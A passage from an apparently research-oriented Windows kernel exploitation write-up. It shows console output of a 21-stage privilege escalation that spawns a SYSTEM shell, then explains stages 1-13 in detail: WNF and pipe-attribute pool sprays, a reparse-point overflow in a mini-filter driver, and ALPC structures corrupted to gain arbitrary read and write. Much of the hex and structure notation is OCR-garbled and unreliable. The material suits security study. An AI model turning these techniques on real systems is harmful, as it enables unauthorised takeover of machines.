STAGE 11: SECOND WNF SPRAY $\[ + \]$ Created and updated 1536 second wave WNF $\[ + \]$ Waiting for the memory to stabilize... $\[ + \]$ Stage 11 COMPLETE

STAGE 12: CREATE HOLES (SECOND)

$\[ \+ \]$ Created 768 holes

$\[ \+ \]$ Waiting for the memory to stabilize... $\[ + \]$ Stage 12 COMPLETE

STAGE 13: PLACE SECOND OVERFLOW $\[ + \]$ Reparse point set (ChangeStamp=0xDEAD) $\[ + \]$ Stage 13 COMPLETE

STAGE 14: TRIGGER SECOND OVERFLOW $\[ + \]$ Second overflow triggered $\[ + \]$ Waiting for the memory to stabilize...

[https://exploitreversing.com](https://exploitreversing.com/) $\[ \+ \]$ Stage 14 COMPLETE

STAGE 15: FILL WITH PIPE ATTRS $\[ + \]$ Set 1536 large pipe attributes $\[ + \]$ Waiting for the memory to stabilize... $\[ + \]$ Stage 15 COMPLETE

STAGE 16: FIND VICTIM & LEAK PIPE $\[ + \]$ Found second victim WNF at index 1 $\[ + \]$ PIPE\_ATTRIBUTE LEAKED: 0xFFFFBE0FCFE38650 $\[ + \]$ Stage 16 COMPLETE

STAGE 17: SETUP ARBITRARY READ $\[ + \]$ Fake pipe\_attr at: 0x00007FF7F94FB9F0 $\[ + \]$ pipe\_attribute->Flink corrupted $\[ + \]$ Stage 17 COMPLETE

STAGE 18: READ KERNEL MEMORY

\[+\] Found target pipe at index 0

$\[ \\star \]$ KALPC\_RESERVE: +0x00: 0xFFFF9D07104BCDE0 $+ \\Theta \\times \\Theta 8$ : 0xFFFFBE0FB9D86D08 +0x10: 0x0000000000000010 $+ \\Theta \\times 1 8$ : 0xFFFFBE0FBCF375B0

$\[ \+ \]$ Arbitrary READ primitive established! $\[ + \]$ Stage 18 COMPLETE

STAGE 19: DISCOVER EPROCESS/TOKEN

\[+\] ALPC\_PORT: 0xFFFF9D07104BCDE0

$\[ \+ \]$ EPROCESS: 0xFFFF9D0711617080 (EXPLOIT.exe)

\[\*\] Our PID: 8352

$\[ \+ \]$ Our EPROCESS: 0xFFFF9D0711617080

$\[ \+ \]$ Our Token: 0xFFFFBE0FB5E6C060

$\[ \+ \]$ SYSTEM EPROCESS: 0xFFFF9D070B261040

$\[ \+ \]$ SYSTEM Token: 0xFFFFBE0FB0A87720

$\[ \+ \]$ Winlogon PID: 584

$\[ \+ \]$ Stage 19 COMPLETE

STAGE 20: ALPC ARBITRARY WRITE

$\[ \\star \]$ Setting up fake KALPC structures...

$\[ \+ \]$ Fake KALPC\_RESERVE: 0x00007FF7F94FCE80

$\[ \+ \]$ Fake KALPC\_MESSAGE: 0x00007FF7F94FCEC0

$\[ \+ \]$ Target (Token+0x40): 0xFFFFBE0FB5E6C0A0

$\[ \\star \]$ Leaked KALPC\_RESERVE from Stage 8: 0xFFFFBE0FD53CEBB0 $\[ \\star \]$ This was at offset 0xFF0 from WNF overflow

$\[ \\star \]$ Corrupting via first WNF overflow...

$\[ \+ \]$ First WNF overflow complete - Handles array entry corrupted $\[ \\star \]$ Sending ALPC messages...

[https://exploitreversing.com](https://exploitreversing.com/)

$\[ \+ \]$ ALPC messages sent

$\[ \\star \]$ Testing privilege elevation..

$\[ \+ \]$ SUCCESS! Can open winlogon (PID 584) - privileges elevated! $\[ + \]$ Stage 20 COMPLETE

STAGE 21: SPAWN SYSTEM SHELL $\[ + \]$ Enabled SeDebugPrivilege $\[ + \]$ Using winlogon PID: 584 $\[ + \]$ Opened winlogon: 0x0000000000008448

\[+\] ====

$\[ \+ \]$ SYSTEM SHELL SPAWNED!

$\[ \+ \]$ PID: 7804

\[+\] ====

$\[ \+ \]$ Stage 21 COMPLETE

EXPLOIT SUCCESSFUL!

$\[ \\star \]$ Press ENTER to cleanup and exit...

Microsoft Windows \[Version 10.0.19045.2965\] (c) Microsoft Corporation. All rights reserved.

C:\\Users\\Administrator\\Desktop\\RESEARCH>whoami nt authority\\system

C:\\Users\\Administrator\\Desktop\\RESEARCH>

# 16.06. Exploit details

The following list is only a simplified list to provide a general idea of sequence of tasks, and which will be used as reference for the upcoming brief technical explanation about each exploitation stage.

Exploitation Stages:

▪ Stage 01: Defragmentation (Pipes) ▪ Stage 02: WNF Spray (Leak primitive setup) ▪ Stage 03: Create Holes (Delete alternate WNF) ▪ Stage 04: Place Overflow Buffer (Reparse point) ▪ Stage 05: ALPC Ports (Handle table setup) ▪ Stage 06: Trigger Vulnerability (First overflow) ▪ Stage 07: ALPC Reserves (Leak target placement) ▪ Stage 08: Leak Kernel Pointer (OOB Read) ▪ Stage 09: Create Pipes (Read primitive setup) ▪ Stage 10: Spray Pipe Attributes (Claim) Stage 11: Second WNF Spray (Corruption target)

Stage 12: Create Holes (Delete alternate WNF) ▪ Stage 13: Place Second Overflow (Reparse point) Stage 14: Trigger Second Overflow (Corruption) Stage 15: Fill With Pipe Attributes (Large) Stage 16: Find Victim WNF & Leak Pipe Stage 17: Setup Arbitrary Read (Fake structures) ▪ Stage 18: Verify Arbitrary Read (Kernel read) Stage 19: Discover EPROCESS & Token Stage 20: ALPC Arbitrary Write Stage 21: Spawn SYSTEM Shell

have used a series of other markers throughout the exploit, and all of them have been chosen to help me to identify them during my debug sessions:

# Overflow/fill patterns:

0x50: RefreshPipeCorruption (overflow data fill)

0x51: First wave WNF data (Stage 02)

0x52: Second wave WNF data (Stage 11)

0x54: Spray Pipe Attributes (Stage 10)

0x55: Fill With Pipes (Stage 15)

0x56: Setup Arbitrary Read overflow fill (Stage 17)

0x57: ALPC Write overflow fill (Stage 20)

0xAB: Reparse payload fill byte (Stage 04, Stage 13)

# RefreshPipeCorruption markers:

fake1\[5\] $=$ 0x4747474747474747ULL $\\mathsf { f a k e 2 \[ 0 \] } = 0 \\times 4 8 4 8 4 8 4 8 4 8 4 8 4 8 4 8 \\mathsf { U L L }$ fake2\[5\] $=$ 0x4949494949494949ULL

# Stage 17 initial markers:

fake1\[5\] $=$ 0x6969696969696969ULL fake2\[0\] $=$ 0x7070707070707070ULL fake2\[5\] $=$ 0x7171717171717171ULL

# IsKernelPointer filter:

0x5151515151515151ULL (first wave) ▪ 0x5252525252525252ULL (second wave)

Each stage has its own dynamic, and I will try to explain tasks done by each stage.

# Stage 01: Defragmentation (Pipes)

This stage performs an initial spray padding through CreatePipe function and uses sacrificial objects to catch and fill eventual holes, followed by freeing the same sprayed objects. The goal is to prepare a stable and clean segment to ensure that next allocations will be predictable and subsequently allocated. There is not a correct value or way to spray, and this stage allocates 5000 pipe pairs in double-round using

[https://exploitreversing.com](https://exploitreversing.com/)

CreatePipe function, whose objects will be allocated in NonPagedPool. Afterwards, the program does a pause (I used $1 0 0 0 ~ \\mathsf { m s }$ , but depending on the context, it might be values around $2 0 0 0 \\mathsf { m } \\mathsf { s }$ ) to let kernel and memory pool allocator finish eventual housekeeping and also delayed operations. Finally, the program frees all allocated pipe pairs (read and write channels, and that is the reason for CloseHandle function being called twice). It makes the pool region become consolidated and non-fragmented, and next allocations will be contiguous and sequential. About my object choice, I could have picked up either WNF or Event objects, but as WNF objects will be used in next stages and Event object were used in the previous evtcorruption.cpp program, so I decided to implement this stage using Pipe objects.

# Stage 02: WNF Spray (Leak primitive setup)

This stage implements an initial spray using 5,000 \_WNF\_STATE\_DATA objects (from Windows Notification Facility), via NtCreateWnfStateName function, to fill eventual gaps and eliminate possible fragmentation. A second and real spray with $0 \\times 8 0 0$ objects (actually, they are structures) will be target objects that later we will corrupt to get out-of-bound read primitive and leak some kernel pointers. WNF allocation occurs in NonPagedPool. An interesting detail is that NtCreateWnfStateName creates the state name (composed by metadata and handle) but not really allocates the data buffer in the pool. This work is done by NtUpdateWnfStateData function, which allocates each structure with 0xFF0 bytes of data (given by WNF\_DATA\_SIZE), filled up with 0x51 pattern, and uses the own index as ChangeStamp marker for later identification and reference (as you will see on Stage 07). I have opted by choosing a ChangeStamp marker that I could use as reference and understand exactly what would be happening, thus I thought that the own index would be a better choice. The \_WNF\_STATE\_DATA is composed of a header (0x10 bytes) and data (defined as 0xFF0 bytes, as shown), which results in 0x1000 bytes that are suitable for next exploitation stages.

The obtained memory pool organization follows:

\[WNF1\]\[WFN2\]\[WNF3\]\[WFN4\]\[WNF5\]\[WFN6\]\[WNF7\]\[WFN7\]\[WNF8\]\[WFN9\]...\[WNF4998\]\[WFN4999\]

Other decisions have been strategically considered like choosing a temporary name (WnfTemporaryStateName) that automatically cleanup on process exit and the scope is local and isolated (WnfDataScopeUser). I have declared two arrays using std::make\_unique, which returns a std::unique\_ptr (smart pointer) that manages a dynamic allocated array, where one of then tracks the active and existing WNF and the other one controls pointers to WNF\_STATE\_NAME structure that receives new created state name. Finally, while calling NtCreateWnfStateName, it is always necessary to specify a security descriptor and if you forget it then the function will return an error.

# Stage 03: Create Holes (Delete alternate WNF)

This stage deletes every other WNF object to create holes (half of the sprayed objects in the previous stage) by invoking NtDeleteWnfStateName function, and this action increases the probability of next allocations (in this case, exactly the buffer that will be overflowed in the next stage) to land next to one of these already allocated WNF objects. The choice of $50 %$ for holes is a common approach, and there are other alternatives like $33 %$ of holes or larger holes, but everything depends on the target. Later, such holes will be refilled with ALPC objects, and it will generate a kind of competition between the buffer overflow

[https://exploitreversing.com](https://exploitreversing.com/)

(stage 04) and ALPC (stage 07) to fill these holes. Thus, as WNF\_SPRAY\_COUNT has been setup in $0 \\times 8 0 0$ , the exploit is deleting $0 \\times 4 0 0$ holes and leaving other $0 \\times 4 0 0$ WNF objects that will be used as target. As I mentioned previously, the spray count variable can be adjusted to a better efficient and probability to find WNF targets. After this stage, we have a transition between two memory pool layouts:

\[WNF0\] \[WNF1\] \[WFN2\] \[WNF3\] \[WFN4\] \[WNF5\] \[WFN6\] \[WNF7\]...\[WNF4998\] \[WFN4999\] (before) \[HOLE\] \[WNF1\] \[HOLE\] \[WNF3\] \[HOLE\] \[WNF5\] \[HOLE\] \[WNF7\] \[HOLE\] \[WNF9\]... (after)

# Stage 04: Place Overflow Buffer (Reparse point)

This stage is a preparatory stage that reproduces part of the dynamic used in previous sections, where a customized reparse point is created and prepared to be opened later (Stage 06), which will trigger the vulnerability via HsmIBitmapNORMALOpen function when a reading operation occurs (Stage 06). The HsmIBitmapNORMALOpen function allocates a 0x1000-byte buffer and copies data into it, but as you remember, it is where the vulnerability was found, and we used a technique to cause an overflow of 0x10 bytes that overwrote the adjacent object. By the way, we have already demonstrated this effect twice using pool and event objects when we passed 0x1010 bytes that overwrote the adjacent 0x1000-byte object.

At the beginning of this stage CreateFileW is used to create the reparse point, and we will build a fake \_WNF\_STATE\_DATA header beyond the limit of the allocation (0x1000), which will overflow and write a 0x10 WNF header when the vulnerability is triggered (Stage 06). Therefore, we will have an initial $0 { \\times } 1 0 0 0 \\cdot$ byte payload (filled by 0xAB) followed by a fake header built at offset 0x1000 onward. The fake WNF header is composed of Flags (0x00200904), AllocatedSize (0xFF8), DataSize (0xFF8) and ChangeStamp, which works as a marker (0xCODE). The choice of 0xFF8 as AllocatedSize and DataSize will provide us with an out-of-boundary read of 8-bytes of the next adjacent object (ALPC objects will be allocated in the next stage). The reason for this 8-byte out-of-boundary is due to the fact that the original WNF object has 0xFF0 bytes and the corrupted one (actually, fake) has 0xFF8 bytes.

The representation of the new memory transition follows:

\[HOLE\] \[WNF1\] \[HOLE\] \[WNF3\] \[HOLE\] \[WNF5\] \[HOLE\] \[WNF7\] \[HOLE\] \[WNF9\]... (before) \[OVRF\] \[WNF1\] \[HOLE\] \[WNF3\] \[HOLE\] \[WNF5\] \[HOLE\] \[WNF7\] \[HOLE\] \[WNF9\]... (after)

Therefore, the code in this stage builds and prepares the reparse point that, once the vulnerability is triggered, it will because the first chunk (\[OVRF\]) to be overflowed, reaches, and corrupts the next and adjacent one (\[WNF1\]). Consequently, this new corruption will compromise the next and adjacent element, which is a hole for now (\[HOLE\]), but will be filled with an ALPC object in the following stages.

# Stage 05: ALPC Ports (Handle table setup)

This stage creates 2000 ALPC ports, controlled by ALPC\_PORT\_COUNT parameter, via NtAlpcCreatePort, which allocates \_ALPC\_PORT structure in NonPagedPool, but are not these ALPC ports that will fill the holes created in Stage 03, even because the ALPC port objects are small and allocated in a different location on memory. Each ALPC port is associated with a \_ALPC\_HANDLE\_TABLE, which is allocated by when an ALPC port is added. Actually, this is a preparatory stage, which will be completed by Stage 07.

[https://exploitreversing.com](https://exploitreversing.com/)

After this stage, the memory pool layout keeps unaltered because, as already explained, the ALPC ports are allocated in a different memory region:

\[OVRF\] \[WNF1\] \[HOLE\] \[WNF3\] \[HOLE\] \[WNF5\] \[HOLE\] \[WNF7\] \[HOLE\] \[WNF9\]... (before) \[OVRF\] \[WNF1\] \[HOLE\] \[WNF3\] \[HOLE\] \[WNF5\] \[HOLE\] \[WNF7\] \[HOLE\] \[WNF9\].. (after)

The plan to be executed ahead is to use the overflow (\[OVRF\]) to compromise the WNF object (\[WNF1\]) and read data into ALPC object, what will be placed after the WNF object.

# Stage 06: Trigger Vulnerability (First overflow)

This stage triggers the mini-filter driver overflow vulnerability by opening and reading the reparse point file (prepared in the Stage 04) via CreateFileW function, which corrupts up to 0x10 bytes of the adjacent WNF structure (WNF\_STATE\_DATA), and in particular its DataSize field by changing it from 0xFF0 to 0xFF8.

Once DataSize field has been increased, the memory manager thinks that the WNF data size has 0xFF8 bytes (instead of 0xFF0 bytes), which creates and enables an out-of-boundary read primitive that provides us with the possibility of reading $0 \\times 0 8$ bytes from the next and adjacent memory (an ALPC object, which will be an KALPC\_RESERVE).

The representation of the new memory transition follows:

\[OVRF\] \[WNF1\] \[HOLE\] \[WNF3\] \[HOLE\] \[WNF5\] \[HOLE\] \[WNF7\] \[HOLE\] \[WNF9\]... (before) \[OVRF\] \[WNF1\] \[HOLE\] \[WNF3\] \[HOLE\] \[WNF5\] \[HOLE\] \[WNF7\] \[HOLE\] \[WNF9\]... (after)

The $\[ \\mathsf { W N F } \_ { 1 } \]$ structure is the 0x10-byte corrupted WNF structure, which will be used to read 0x08 bytes from the next and adjacent \[ALPC\] object (KALPC\_RESERVE from Handles array) that will be allocated in Stage 07.

The preparation for this overflow has been done in Stage 04, and after the overflow and overwriting, the corrupted WNF layout is:

▪ +0x00: 0x00200904 (fake header)

▪ +0x04: 0x00000FF8 (AllocatedSize)

▪ +0x08: 0x00000FF8 (DataSize - will be used to get OOB reading)

▪ $\+ 0 { \\times } 0 \\mathbb { C }$ : 0x0000C0DE (ChangeStamp marker)

The trick happens in the change of DataSize from 0xFF0 to 0xFF8, which will help us to gain an OOB read primitive exactly due to the difference of $0 \\times 0 8$ bytes. About the 0x00200904 from header, 0x904 means WNF\_STATE\_DATA\_CODE, and NodeByteSize (from \_WNF\_NODE\_HEADER) cannot be zero then values like $0 \\times 0 0 1 0$ or 0x0020 work.

# Stage 07: ALPC Reserves (Leak target placement)

This stage is responsible for filling the remaining holes (ALPC\_PORT\_COUNT $= = 2 0 0 0$ ), but that cannot be done using handle tables itself, but one of its members. As I explained previously, if we add resource reserves (\_KALPC\_RESERVE) by calling NtAplcCreateResourceReserve function, the AlpcAddHandleTableEntry function will be called and adds an entry to Handles array member of the

\_ALPC\_HANDLE\_TABLE. Consequently, Handles array (and not the handle table itself) soon will run out of space and, in response, it will expand and double its size until it runs out of space again, and the same procedure is repeated until it reaches $0 \\times 1 0 0 0$ bytes (equivalent to 257 handle entries -- ALPC\_RESERVES\_PER\_PORT $= 2 5 7$ ), and the Handles array will be reallocated to the hole that matches exactly the same size, but the handle table stay where it is. Thus, and to be clear, the Handles array grows up in response to the number of handles being added to it, and not the handle table.

Both structures are shown again, as follow:

// $\\Theta \\times 2 \\Theta$ bytes (sizeof)

struct \_ALPC\_HANDLE\_TABLE

{ struct \_ALPC\_HANDLE\_ENTRY $\\star$ Handles; //0x0 struct \_EX\_PUSH\_LOCK Lock; //0x8 ULONGLONG TotalHandles; //0x10 ULONG Flags; //0x18

};

// $\\odot \\times 3 \\odot$ bytes (sizeof)

struct \_KALPC\_RESERVE

{ struct \_ALPC\_PORT\* OwnerPort; //0x0 struct \_ALPC\_HANDLE\_TABLE\* HandleTable; //0x8 VOID\* Handle; //0x10 struct \_KALPC\_MESSAGE\* Message; //0x18 ULONGLONG Size; //0x20 LONG Active; // $\\Theta \\times 2 8$

};

Each handle table entry (PALPC\_HANDLE\_ENTRY) has 8 bytes, which is a reference to an associated KALPC\_RESERVE structure with $\\mathtt { 0 } \\mathtt { x } 2 8$ bytes (40 bytes), and its definition is the following:

0: kd> dt nt!\_KALPC\_RESERVE

$\+ \\Theta \\times \\Theta \\Theta \\Theta$ OwnerPort : Ptr64 \_ALPC\_PORT // Points to \_ALPC\_PORT.

$\+ \\Theta \\times \\Theta \\Theta 8$ HandleTable : Ptr64 \_ALPC\_HANDLE\_TABLE // Points to \_ALPC\_HANDLE\_TABLE.

$\+ \\Theta \\times \\Theta \\mathbb { 1 } \\Theta$ Handle : Ptr64 Void // Reverse handle value.

$\+ \\Theta \\times \\Theta 1 8$ Message : Ptr64 \_KALPC\_MESSAGE // Points to \_KALPC\_MESSAGE.

$\+ \\Theta \\times \\Theta 2 \\Theta$ Size : Uint8B // It is $\\Theta \\times 2 8$ bytes.

$\+ \\Theta \\times \\Theta 2 8$ Active : Int4B // 1 means active.

To show the evolution of the Handles array size, as it initial size is small, we need to do successive allocations (257) to force it to reach $0 \\times 1 0 0 0$ bytes (like the hole’s size), as shown below:

Initial: $\\mathtt { 0 } \\times 2 0$ bytes 4 entries Full, grow: 0x40 bytes 8 entries (triggers the $5 ^ { \\mathrm { t h } }$ reserve) ▪ Full, grow: 0x80 bytes 16 entries (triggers the ${ \\mathsf { 9 } } ^ { \\mathrm { t h } }$ reserve) Full, grow: 0x100 bytes 32 entries (triggers the $1 7 ^ { \\mathrm { t h } }$ reserve) Full, grow: $\\mathtt { 0 \\times 2 0 0 }$ bytes 64 entries (triggers the $3 3 ^ { \\mathsf { r d } }$ reserve) ▪ Full, grow: 0x400 bytes 128 entries (triggers the $6 5 ^ { \\mathrm { t h } }$ reserve) Full, grow: 0x800 bytes 256 entries (triggers the $1 2 9 ^ { \\mathrm { t h } }$ reserve) Full, grow: 0x1000 bytes 512 entries (triggers the $2 5 7 ^ { \\mathrm { t h } }$ reserve)

Therefore:

[https://exploitreversing.com](https://exploitreversing.com/)

▪ Resource Reserves 1-256: Handle table $= 0 { \\times } 8 0 0$ bytes (fits 256 entries) ▪ Resource Reserve 257: Table full grows to $0 \\times 1 0 0 0$ bytes (fits 512 entries)

Something that is really appropriate to underscore is that the first resource reserve handle is saved into g\_saved\_reserve\_handle variable. This handle will be used later (Stage 20) when we corrupt the handle table entry exactly to force an entry to point to our a fake KALPC\_RESERVE structure built in user-space and finally send a message using this same resource reserve to trigger arbitrary write.

This stage prepares the information that will be leaked (8 bytes) by the corrupted WNF structure, and the memory layout is:

\[OVRF\] \[WNF1\] \[Handles array\] \[WNF3\] \[Handles array\] \[WNF5\] \[Handles array\] \[WNF7\]....

# Stage 08: Leak Kernel Pointer (OOB Read)

This stage scan over WNF objects to find the corrupted victim, which will be used to leak 8-bytes from the adjacent Handles array and that also represents the address of the first \_KALPC\_RESERVE (associated with an \_ALPC\_HANDLE\_TABLE). However, the challenge is to find exact corrupted WNF structure, and we will use the ChangeStamp (0xCODE) as a reference marker. As WNF objects have been filled in odd indexes then this code also searches only odd positions and checks the WNF size by using NtQueryWnfStateData function. If the status $= =$ STATUS\_BUFFER\_TOO\_SMALL then WNF has data to return. Additionally, if ChangeStamp $\\mathtt { \\Gamma = } 0 { \\times } 0 0 \\mathsf { E }$ , we found the corrupted WNF object.

Once the corrupted WNF object has been found, the next step is to get its size using NtQueryWnfStateData function, which is 0xFF8 because we have corrupted the header and in special DataSize field. Finally, using NtQueryWnfStateData function for the third time, the code reads 0xFF8 bytes (a series of 0x51 patterns), which added to a header with ${ 0 } { \\times 1 0 }$ bytes, exceeds the 0x1000 boundary, and reaches and reads 0x08 bytes from the next and adjacent object, so it leaks data from Handles array, which is a pointer to the first \_KALPC\_RESERVE structure and consequently is a kernel address. This \_KALPC\_RESERVE address will be used in Stage 18. You must notice that we read 0xFF0 units of 0x51 patterns from WNF object followed by the header (0x08 bytes) from the adjacent ALPC object.

Finally, the kernel point extraction and validation occur at the end of this stage by using IsKernelPointer helper function, which checks if the read data is not the pattern itself (0x51 in this stage, and 0x52 in a later stage), and it is not then it extracts the kernel pointer. The leaked pointer is saved into g\_leaked\_kalpc variable that will be used later.

The memory layout is the same:

\[OVRF\] \[WNF1\] \[Handles array\] \[WNF3\] \[Handles array\] \[WNF5\] \[Handles array\] \[WNF7\]....

# Stage 09: Create Pipes (Read primitive setup)

In this stage we create multiple 1000-byte Pipe pairs objects (PIPE\_SPRAY\_COUNT $= = 0 \\times 6 0 0$ ) using CreatePipe function, and this objects contains NpPipeAttribute/PipeAttribute structures that will be allocated in next steps (Stages 10 and 15). As I mentioned in earlier sections, we can create named or anonymous pipe pairs, but in this case it will be created anonymous pipes. One of reasons for choosing

[https://exploitreversing.com](https://exploitreversing.com/)

Pipe is that its structure is well-defined and mainly that kernel allocates NpPipeAttribute (same of PipeAttribute) in the pool. Furthermore, the structure contains doubly-linked list pointers (Flink and Blink), and both can become a potential target to point to fake structure, which provides the possibility of performing arbitrary read using FSCTL\_PIPE\_GET\_PIPE\_ATTRIBUTE.

One of details associated with this part of the code are definitions of two arrays containing HANDLE object, being one of them is dedicated to writing and the other one to reading, which represents the read and write ends of the pipe. The read array (g\_pipe\_read\[ \]) can be used for cleaning up, but the write array (g\_pipe\_write\[ \]) is used for set-operation and get-operations.

A relevant point is that Pipe object allocations are done in a different pool area than the first WNF $^ +$ ALPC objects wave, thereby it does not corrupt or overwrite any object from the previous allocation as well as the leaked pointer to \_KALPC\_RESERVE, and we can consider them independent from each other.

The layout of the memory (a different place from the first one) is:

\[Pipe0\]\[Pipe1\]\[Pipe2\]\[Pipe3\]\[Pipe4\]\[Pipe5\]\[Pipe6\]\[Pipe7\]\[Pipe8\]\[Pipe9\]\[Pipe10\]\[Pipe11\]...

# Stage 10: Spray Pipe Attributes (Claim)

This stage is based on the previous one (actually is a tightly interconnected stage) and sets a pipe attribute on each CreatePipe object using NtFsControlFile function with FSCTL\_PIPE\_SET\_PIPE\_ATTRIBUTE, which allows to send a control request to the Named Pipe File System (NpFs), and it is designed to set attributes on an existing pipe instance as created in Stage 09.

To provide a better explanation, I need to repeat structure definitions:

# struct PipeAttribute {

LIST\_ENTRY list; char\* AttributeName; uint64\_t AttributeValueSize; char\* AttributeValue; char data\[0\]; };

// $\+ \\odot \\times \\odot \\odot$ : Doubly-linked list entry (16 bytes) // $+ \\odot \\times \\perp \\odot$ : Pointer to attribute name string // $+ \\odot \\times \\perp 8$ : Size of attribute value // $+ \\odot \\times 2 \\odot$ : Pointer to attribute value data // $+ \\odot \\times 2 8$ : Flexible array member (inline data)

# BOOL CreatePipe(

PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY\_ATTRIBUTES lpPipeAttributes, DWORD nSize );

As result, the kernel allocates a PipeAttribute structure to store an attribute data, whose initial size is $\\mathtt { 0 \\times 2 0 0 }$ bytes (PIPE\_ATTR\_CLAIM\_SIZE), on kernel pool space. This can be confirmed by analyzing the NtFsControlFile function call, where we clearly see that g\_pipe\_write holds a handle to a pipe instance (created with CreatePipe function in the previous stage), array\_data\_pipe is the inputBuffer and describes the attribute to set and PIPE\_ATTR\_CLAIM\_SIZE is the inputBufferLength (0x200 bytes). The for loop runs PIPE\_SPRAY\_COUNT (0x600) times and sets up a sequence of $0 \\times 6 0 0$ PipeAttributes with allocation of $\\mathtt { 0 \\times 2 0 0 }$ bytes. No doubts that $\\mathtt { 0 \\times 2 0 0 }$ bytes seem to be too small and do not fit and complete a 0x1000 byte hole, but as explained it forces the PipeAttribute creation and allocation, which will be assigned to a

[https://exploitreversing.com](https://exploitreversing.com/)

smaller bucket and tracked by the pool allocator. Later, in stage 15, this object will be expanded to 0x1000, and it will force kernel to reallocate it to $0 \\times 1 0 0 0$ bucket.

An aspect of PipeAttribute/NpPipeAttribute structure is that:

▪ Header: offset $\_ { 0 \\times 0 0 }$ to $\\mathtt { 0 } \\mathtt { x } 2 8$ $S \_ { Ḋ } \\mathrm { i } z e Ḍ = 0 \\times 2 8$ bytes) AttributeName: offset ${ 0 } { \\times 1 0 }$ \| points to start of data\[0\] array $( { \\mathsf { s i z e } } = = { \\mathsf { 0 } } { \\times } 2 0 + { \\mathsf { 0 } } { \\times } 0 1$ null) ▪ AttributeValue: offset $\\mathtt { 0 } \\mathtt { x } 2 0$ \| points into data\[0\] $1 + 0 { \\times } 2 1$ (siz $\\mathrel { \\mathop { : } } = = 0 { \\times } 4 0$ bytes)

Both AttributeName and AttributeValue are given by memset function calls and have a series of $\\mathtt { 0 } { \\times } 5 4$ patterns as content. A breakdown of both CreatePipe and PipeAttribute/NpPipeAttribute follows:

CreatePipe (Stage 09) Creates Pipe object in kernel g\_pipe\_read\[i\] (read handle) g\_pipe\_write\[i\] (write handle) Pipe object has attribute list (initially empty)

NtFsControlFile (Stage 10) Creates PipeAttribute structure (via FSCTL\_PIPE\_SET\_PIPE\_ATTRIBUTE) ▪ AttributeName $=$ "TTTT..." $( 0 \\times 5 4 \\times 3 2$ , null-terminated) AttributeValue $=$ "TTTT..." $( 0 \\times 5 4 \\times 6 4 )$ Linked into pipe's attribute list

Therefore, Stage 09 creates $0 \\times 6 0 0$ CreatePipe objects, and this stage created and allocated a PipeAttribute/NpPipeAttribute with $\\mathtt { 0 \\times 2 0 0 }$ bytes to each CreatePipe object.

The layout of one single Pipe object and its respective PipeAttribute object is:

▪ Pipe object PipeAttributes field PipeAttribute (the first field is a doubly-linked list entry)

This association shows that the memory allocation region of Pipe objects and PipeAttribute structures are completely different, and both can be considered as a separate set of objects connected to each other:

\[Pipe0\]\[Pipe1\]\[Pipe2\]\[Pipe3\]\[Pipe4\]\[Pipe5\]\[Pipe6\]\[Pipe7\]... (region A) ▪ \[PipeAttr0\]\[PipeAttr1\]\[PipeAttr2\]\[PipeAttr3\]\[PipeAttr4\]\[PipeAttr5\]\[PipeAttr6\]\[PipeAttr7\]... (region B)

In conclusion of this section, we actually spray PipeAttribute structures, which are our target and that will be corrupted later and not Pipe objects themselves. Pipe objects have been created at Stage 09 to provide us with a kind of vehicle (or vector) to create PipeAttributes and have a handle to each Pipe object to offer a viable reference. As readers will learn in next stages, we will expand PipeAttributes to 0x1000 bytes in Stage 15 and read data from AttributeValue pointer, which will have been corrupted, in Stage 20.

# Stage 11: Second WNF Spray (Corruption target)

This stage, which is responsible for a second wave of WNF objects, creates \_WNF\_STATE\_DATA objects using NtCreateWnfStateName function and allocate such structures using NtUpdateWnfStateData function in the same pool as the PipeAttribute structures, which were created in Stage 10. The spray is composed of two phases again, which the first one (WNF\_PAD\_SPRAY\_COUNT\_SECOND $= 0 { \\times } 2 0 0 0$ ) is to defrag memory

[https://exploitreversing.com](https://exploitreversing.com/)

and the second is the real one. The WNF\_SPRAY\_COUNT\_SECOND matches with PIPE\_SPRAY\_COUNT (both $0 \\times 6 0 0 )$ to create an equal and balanced proportion between WNF and PipeAttribute structures. It is sets up a different marker (ChangeStamp $= =$ 0xDEAD) that will be used to guide us to find the corrupted WNF structure. Each WNF structure has $0 \\times 1 0 0 0$ bytes, whose DataSize is 0xFF0 (allocated with 0x52 patterns) and the fixed header has 0x10 bytes.

In terms of code, there are three declared arrays that need to be descripted:

g\_wnf\_pad\_names\_second\[ \]: this array is used for holding padding WNF names.

g\_wnf\_names\_second\[ \]: this array is used for holding target WNF names. g\_wnf\_active\_second\[ \]: this array tracks which WNF are still active.

In the next stages, I will repeat a similar approach to the first stages, where holes will be created, but this time a distinct set of objects will fill these holes.

The memory layout after this stage is:

\[PipeAttr0\]\[PipeAttr1\]\[PipeAttr2\] \[PipeAttr3\]\[PipeAttr4\]... (small buckets \| 0x200 bytes) \[WNF0\]\[WNF1\]\[WNF2\]\[WNF3\]\[WNF4\]... (large buckets \| 0x1000 bytes)

# Stage 12: Create Holes (Delete alternate WNF)

This stage aims to create holes in the second wave WNF spray from Stage 11, by deleting every other WNF object (\_WNF\_STATE\_DATA) using NtDeleteWnfStateName function.

We have created $0 \\times 3 0 0$ holes, and each of them has 0x1000 bytes, later (Stage 15) we will fill them with PipeAttributes objects, but not before expanding their sizes to 0x1000 bytes.

Through a similar approach used previously, and an array named g\_wnf\_active\_second keep a list of active objects, which restricts the list of objects to be scanned on Stage 16.

The memory layout is:

\[PipeAttr0\]\[PipeAttr1\]\[PipeAttr2\] \[PipeAttr3\]...

\[HOLE\]\[WNF1\]\[HOLE\]\[WNF3\]\[HOLE\]...

# Stage 13: Place Second Overflow (Reparse point)

This stage uses the mini-driver reparse point vulnerability to overflow the allocated buffer once again, and similarly we had done in Stage 04, we can corrupt the next and adjacent WNF structure, and differences are that we are handling with the second WNF wave from Stage 11 and that the marker is 0xDEAD rather than 0xCODE as in Stage 04.

I have used CreateFileW function to create the second reparse point file, the overflow size (PAYLOAD\_SIZE\_OVERFLOW) is 0x1010 and the same 0xAB fill pattern (PAYLOAD\_FILL\_BYTE) is used. The payload construction is identical to the previous one, using the same Allocated and DataSize value (0xFF8).

At this point, the payload has been built, but the overflow and WNF corruption themselves have not happened yet. Therefore, the memory layout is the same:

\[PipeAttr0\]\[PipeAttr1\]\[PipeAttr2\] \[PipeAttr3\]...

\[HOLE\]\[WNF1\]\[HOLE\]\[WNF3\]\[HOLE\]...

(small buckets \| 0x200 bytes) (large buckets \| 0x1000 bytes)

# Stage 14: Trigger Second Overflow (Corruption)

